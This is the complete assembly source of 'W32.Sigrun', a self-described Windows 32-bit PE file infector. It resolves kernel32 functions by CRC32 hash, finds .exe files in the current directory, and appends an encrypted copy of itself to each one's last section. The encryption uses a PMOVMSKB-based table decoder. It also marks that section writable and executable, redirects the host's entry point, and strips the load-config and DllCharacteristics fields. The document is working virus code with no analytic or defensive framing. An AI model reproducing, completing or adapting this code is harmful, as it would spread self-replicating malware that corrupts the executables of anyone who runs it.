comment ~

W32.Sigrun

- Windows 7 PE 32-bit file infector (append to last section)
- encrypted using MMX/SSE instruction PMOVMSKB (one table required, and it's very long! :) )
- SEH to protect from exceptions and PEB to find DLL address
- 32-bit checksums (to optimize code size by not using API names)


~ 
.386
.model  flat, STDCALL
include sigrun.inc
assume  fs:nothing

.code
code_begin      label    near
        call    GetTickCount
        mov     dword ptr [s], eax
        push    V
        jmp     sigrun_begin

message         label    near
        push    "*"                          ;hold the door, please don't let them in!
        mov     ecx, esp
        xor     ebx, ebx
        push    ebx
        push    7c2h
        push    ebx
        push    ebx
        push    1
        push    ecx
        push    STD_OUTPUT_HANDLE
        call    WriteFile 
        call    Sleep 
        call    ExitProcess

sigrun_begin    label    near
        push    30h                          ;PEB
        pop     esi
        lods    dword ptr fs:[esi]
        mov     ecx, dword ptr [eax + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE]
        add     dword ptr [esp], ecx
        xor     edx, edx
        call    find_krn
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        ret

find_krn        label    near
        push    fs:[edx]
        mov     fs:[edx], esp
        mov     eax, dword ptr [eax + PEB_LDR_DATA]
        mov     esi, dword ptr [eax + 0 + InLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        call    push_crc32s

;-------------------------------------------------------------------------------
;API CRC list for kernel32.dll
;-------------------------------------------------------------------------------

        dd      0efc7ea74h
        dd      02519b15ah
        dd      0391ab6afh
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0b09315f4h
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        db      2eh, 65h, 78h, 65h, 0        ;executable file

push_crc32s     label    near
        pop     esi
        mov     ebp, dword ptr [eax + 18h]

;-------------------------------------------------------------------------------
;walk lists
;-------------------------------------------------------------------------------

walk_dll        label    near
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        mov     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        add     ebx, ebp

walk_names      label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, ebp
        mov     edi, dword ptr [edi + edx * 4]
        add     edi, ebp
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8  
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        je      l_res
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names
        int     3                            ;end up crashing

;-------------------------------------------------------------------------------
;resolve API address
;----
;find exe files
;-------------------------------------------------------------------------------

l_res           label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        xor     edx, edx
        cmp     byte ptr [esi], "*"
        jne     walk_dll
        xchg    esi, eax
        mov     esi, esp
        enter   sizeof WIN32_FIND_DATA + sizeof IMAGE_DOS_HEADER.e_magic, 0
        mov     edi, esp
        push    esp
        push    eax
        call    esFindFirstFileA
        xchg    ebp, eax
        xor     ebx, ebx

;-------------------------------------------------------------------------------
;map view
;-------------------------------------------------------------------------------

create_map      label    near
        pushad  
        push    ebx
        push    ebx
        push    3  
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ or GENERIC_WRITE
        lea     edx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        call    esCreateFileA
        push    eax
        push    eax
        push    ebx
        push    ebx
        mov     ebp, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
        push    ebp
        push    eax
        push    ebx
        add     ebp, 2000h
        push    ebp
        push    ebx
        push    4                            ;PAGE_READWRITE
        push    ebx
        push    eax
        call    esCreateFileMappingA
        push    eax
        push    ebp
        push    ebx
        push    ebx
        push    2                            ;FILE_MAP_WRITE
        push    eax
        call    esMapViewOfFile
        push    eax
        pushad
        call    infect_pe32
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    dword ptr [esi]
        call    esSetFilePointer
        call    esSetEndOfFile
        call    dword ptr [esi]
        popad
        push    edi
        push    ebp
        call    esFindNextFileA
        test    eax, eax
        jnz     create_map

call_outseh     label    near
        int     3

infect_pe32     proc

;-------------------------------------------------------------------------------
;MZ and PE signatures
;-------------------------------------------------------------------------------

        push    fs:[ebx]
        mov     fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     call_outseh
        mov     ebp, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], "EP"
        jne     call_outseh

;-------------------------------------------------------------------------------
;32-bit machine. GUI or CUI mode
;no appended data (virmark, attribute certificates, debug info, etc)
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_I386
        jne     call_outseh
        mov     cl, byte ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem]
        dec     ecx
        dec     ecx
        cmp     cl, IMAGE_SUBSYSTEM_WINDOWS_CUI - IMAGE_SUBSYSTEM_WINDOWS_GUI
        jnbe    call_outseh
        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    ecx, ecx, sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + edx + IMAGE_NT_HEADERS.OptionalHeader - sizeof IMAGE_SECTION_HEADER]
        add     esi, ecx
        mov     ecx, dword ptr [esi + IMAGE_SECTION_HEADER.PointerToRawData]
        push    ecx
        mov     edx, dword ptr [esi + IMAGE_SECTION_HEADER.SizeOfRawData]
        add     ecx, edx
        cmp     dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow], ecx
        jne     call_outseh
        mov     bh, 20h
        stc
                                             ;sizeof STACK_REG - do not change this
        adc     dword ptr [esp + 20h + 18h], ebx
        pop     ecx
        push    edx
        add     ecx, edx
        lea     edi, dword ptr [ebp + ecx]
        add     dword ptr [esi + IMAGE_SECTION_HEADER.SizeOfRawData], ebx
        add     dword ptr [esi + IMAGE_SECTION_HEADER.Misc.VirtualSize], ebx
        add     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebx
        or      dword ptr [esi + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE
        push    eax
        call    $ + 5

delta_addr      label    near
        pop     ecx
        sub     ecx, offset delta_addr - offset sigrun_begin
        push    esi
        push    ecx
        call    skip_decryptor

;-------------------------------------------------------------------------------
;MMX/SSE require this
;-------------------------------------------------------------------------------

.XMM

;-------------------------------------------------------------------------------
;always use same code
;-------------------------------------------------------------------------------

skip_table      label    near
        pop     edi
        push    edi
        mov     esi, edi

decrypt_loop    label    near
        movq    mm1, qword ptr [esi]
        pmovmskb eax, mm1
        stos    byte ptr [edi]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        test    eax, eax
        jnz     decrypt_loop
        pop     edi
        push    "hh86"                       ;replaced by host entrypoint
        jmp     edi

;-------------------------------------------------------------------------------
;insert decryptor and make table
;-------------------------------------------------------------------------------

skip_decryptor  label     near
        mov     al, 0e8h                     ;OPCODE_CALL
        stos    byte ptr [edi]
                                             ;multiply body size by size of value for mask
        mov     eax, ((offset sigrun_end - offset sigrun_begin) * 8) + 4
        stos    dword ptr [edi]
        pop     esi
        push    edi
        add     edi, eax
        push    offset skip_decryptor - offset skip_table
        pop     ecx
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     ebp, edi
        pop     edi
        pop     esi
        push    ebp                          ;save for later use
        mov     ecx, offset sigrun_end - offset sigrun_begin

parse_code      label    near
        lods    byte ptr [esi]
        xchg    edx, eax
        push    8
        pop     ebx

parse_loop      label    near
        ror     dl, 1
        jnc     l2
        call    random
        or      al, 80h                      ;turn on MSB
        jmp     l1
l2:     call    random 
        and     al, 7fh                      ;turn off MSB
l1:     stos    byte ptr [edi]
        dec     ebx
        jnz     parse_loop
        loop    parse_code
        xchg    eax, ecx
        stos    dword ptr [edi]
        pop     edi
        pop     esi
        pop     ecx
        mov     dword ptr [ecx + IMAGE_OHDD32_LOAD_CONFIG_TABLE], eax
        mov     word ptr [ecx + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics], ax
        pop     eax
        add     eax, dword ptr [esi + IMAGE_SECTION_HEADER.VirtualAddress]
        xchg    dword ptr [ecx + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], eax
        mov     dword ptr [edi - 6], eax
        int     3

;-------------------------------------------------------------------------------
;masm32 lib random number generator
;-------------------------------------------------------------------------------

random          proc
        push    ecx
        push    edx
        push    esi
        call    skip_seed

s               label   near
        dd      0

skip_seed       label    near
        pop     esi
        lods    dword ptr [esi]
        test    eax, 80000000h
        jz      skip_sigbit
        add     eax, 7fffffffh

skip_sigbit     label   near
        xor     edx, edx
        mov     ecx, 127773
        div     ecx
        xchg    ecx, eax
        mov     eax, 16807
        mul     edx
        mov     edx, ecx
        xchg    ecx, eax
        mov     eax, 2836
        mul     edx
        sub     ecx, eax
        xchg    eax, ecx
        mov     dword ptr [esi - 4], eax
        pop     esi
        pop     edx
        pop     ecx
        ret
random          endp
infect_pe32     endp
sigrun_end      label    near
end     code_begin